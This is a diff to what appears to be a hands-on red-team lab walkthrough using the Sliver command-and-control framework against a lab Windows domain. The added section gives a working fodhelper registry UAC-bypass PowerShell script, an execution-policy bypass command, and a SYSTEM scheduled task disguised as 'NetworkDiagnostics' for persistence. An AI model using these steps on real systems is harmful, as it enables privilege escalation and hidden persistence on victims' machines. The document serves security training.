@@ -171,7 +171,7 @@ You should see that sliver is waiting on port 443 for the mtls protocol.
 *Sliver waiting for connections*
 Now, move to your RDP session to the client inside of the firewall.
 
-You may get a windows popup warnings about paging files, close those dialogue boxes.
+You will get windows popup warnings about paging files, close those dialogue boxes.
 
 On the desktop there is a file called stager that the
 
@@ -218,10 +218,11 @@ sa-whoami
 
 ![sa-whoami](assets/sa-whoami.png)
 
-This will display some interesting information, such as the Active Directory groups garfield belongs to. We also see that he is not a very privileged user, but he does belong to one group (Helpdesk Support) that may be interesting.
+This will display some interesting information, such as the Active Directory groups garfield belongs to. He belongs to one group (Helpdesk Support) that may be interesting. We can also see that he is a local administrator on his machine (not so suprising if he is in the helpdesk). However, the process we are running in is of medium integrity so we still do not have enough privileges to do nefarious stuff such as creating services. The reason the process is of medium integrity, rather than high, is because of Microsoft UAC (User Access Control). We will bypass that later.
 
 
 We may want to learn about the Active Directory domain. We can use a built in windows command for this.
+The sliver execute command allows us to run built in windows commands.
 
 ```
 execute -o nltest /dclist:
@@ -229,6 +230,45 @@ execute -o nltest /dclist:
 ![nltest](assets/nltest.png)
 
 We can see that the machine has joined the Active Directory domain via its domain controller dc01.crueltesting.com. Good to know?
+
+### Escalating our Privileges (Bypassing Windows UAC)
+
+e are now going to upload a file to Garfield's Desktop to help us bypass the UAC.
+This file is a PowerShell Script and the technique is described in the appendix.
+```
+cat << 'EOF' > /home/localadmin/LAB/bypass.ps1
+$command = "C:\Users\garfield\Desktop\stager.exe"
+New-Item "Registry::HKCU\Software\Classes\ms-settings\Shell\Open\command" -Force
+Set-ItemProperty "Registry::HKCU\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $command -Force
+New-ItemProperty "Registry::HKCU\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Start-Process "C:\Windows\System32\fodhelper.exe"
+EOF
+```
+![Create Bypass file](assets/creating-bypass-file.png
+)
+From the sliver window, we can now upload this file
+
+```
+upload bypass.ps1
+```
+![Uploading Bypass file](assets/upload-bypass.png)
+Then we execute the file
+```
+execute powershell.exe -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; & 'C:\Users\garfield\Desktop\bypass.ps1'"
+```
+![Executing bypass file](assets/execute-bypass.png)
+You should see a new session appear, this one with a higher integrity.
+
+```
+execute -o schtasks /create /tn "NetworkDiagnostics" /tr "C:\Users\garfield\Desktop\stager.exe" /sc onstart /ru "NT AUTHORITY\SYSTEM" /f
+```
+
+```
+execute -o schtasks /run /tn "NetworkDiagnostics"
+```
+### Creating an evil service on Garfield's machine
+
+
 
 ### Learning about Garfields not-so-private-anymore files.
 
